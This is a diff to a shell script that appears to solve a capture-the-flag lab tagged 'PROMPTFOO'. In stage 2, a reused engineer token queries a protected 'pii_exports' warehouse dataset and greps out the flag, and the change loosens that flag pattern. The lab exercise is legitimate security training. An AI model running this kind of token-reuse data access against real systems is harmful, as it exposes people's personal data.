@@ -12,6 +12,6 @@ eng="$(printf '%s' "$resp" | python3 -c 'import sys,json;print(json.load(sys.std
 echo "    engineer_token=$eng"
 
 echo "[*] stage 2 — protected dataset access ->"
-flag="$(curl -s "$BASE/warehouse/query?token=$eng&dataset=pii_exports" | grep -o 'PROMPTFOO{s8_warehouse[^}]*}' | head -n1)"
+flag="$(curl -s "$BASE/warehouse/query?token=$eng&dataset=pii_exports" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
